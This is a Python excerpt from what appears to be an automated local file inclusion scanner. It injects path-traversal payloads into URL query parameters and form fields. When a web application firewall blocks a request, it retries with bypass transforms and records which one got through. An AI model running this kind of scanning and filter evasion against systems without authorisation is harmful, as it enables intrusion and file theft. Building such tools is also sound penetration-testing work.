@dataclass
class Finding:
    location: str
    param: str
    payload: str
    vulnerable: bool
    waf_blocked: bool
    bypassed_with: str = ""
    status: int = 0
    snippet: str = ""


RESULTS_LOCK = threading.Lock()


class Scanner:
    def __init__(self, client, args):
        self.client = client
        self.args = args
        self.findings = []
        self.tested = 0
        self.payloads = QUICK_LFI_PAYLOADS if getattr(args, "quick", False) else LFI_PAYLOADS

    def record(self, finding):
        with RESULTS_LOCK:
            self.findings.append(finding)
            self.tested += 1
        if finding.vulnerable:
            tag = paint("BYPASS+VULN", C.MAGENTA) if finding.bypassed_with else paint("VULNERABLE", C.RED)
            log(f"[!] {tag} {finding.location} param={finding.param} payload={finding.payload!r}"
                + (f" (bypassed via {finding.bypassed_with})" if finding.bypassed_with else ""))
        elif finding.waf_blocked and self.args.verbose:
            log(paint(f"[waf] blocked: {finding.location} param={finding.param} payload={finding.payload!r}", C.YELLOW))
        elif self.args.verbose:
            log(paint(f"[-] no LFI: {finding.location} param={finding.param} payload={finding.payload!r}", C.GREEN))

    def try_payload(self, send_fn, location, param, payload):
        """send_fn(payload) -> Response. Handles WAF-blocked auto-bypass retry."""
        resp = send_fn(payload)
        if resp.error:
            return
        blocked = is_waf_blocked(resp.status, resp.text)
        vulnerable = (not blocked) and is_lfi_successful(payload, resp.text)
        bypassed_with = ""
        if blocked and self.args.bypass:
            for name, transform in BYPASS_TRANSFORMS:
                variant = transform(payload)
                if variant == payload:
                    continue
                r2 = send_fn(variant)
                if r2.error:
                    continue
                if not is_waf_blocked(r2.status, r2.text) and is_lfi_successful(variant, r2.text):
                    resp, vulnerable, bypassed_with = r2, True, name
                    blocked = False
                    break
        self.record(Finding(
            location=location, param=param, payload=payload,
            vulnerable=vulnerable, waf_blocked=blocked, bypassed_with=bypassed_with,
            status=resp.status, snippet=resp.text[:200] if vulnerable else "",
        ))
        if self.args.delay:
            time.sleep(random.uniform(0, self.args.delay))

    # -- injection points --------------------------------------------
    def scan_query_params(self, url):
        parsed = urllib.parse.urlsplit(url)
        params = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
        target_params = list(params.keys()) if params else (
            COMMON_LFI_PARAMS if self.args.guess_params else []
        )
        if not target_params:
            return
        for param in target_params:
            base_params = {k: v[0] for k, v in params.items()}

            def send(payload, base_params=base_params, param=param, parsed=parsed):
                p = dict(base_params)
                p[param] = payload
                q = urllib.parse.urlencode(p)
                test_url = urllib.parse.urlunsplit((parsed.scheme, parsed.netloc, parsed.path, q, ""))
                return self.client.request(test_url)

            location = urllib.parse.urlunsplit((parsed.scheme, parsed.netloc, parsed.path, "", ""))
            for payload in self.payloads:
                self.try_payload(send, location, param, payload)

    def scan_form(self, page_url, form):
        target_url = build_action_url(page_url, form["action"])
        inputs = form["inputs"]
        if not inputs:
            return
        defaults = {i["name"]: i.get("value", "") or "test" for i in inputs}
        method = form["method"]
        for target_input in inputs:
            param = target_input["name"]

            def send(payload, param=param, target_url=target_url, method=method):
                data = dict(defaults)
                data[param] = payload
                if method == "post":
                    return self.client.request(target_url, method="POST", data=data)
                q = urllib.parse.urlencode(data)
                sep = "&" if "?" in target_url else "?"
                return self.client.request(f"{target_url}{sep}{q}")

            for payload in self.payloads:
                self.try_payload(send, target_url, param, payload)


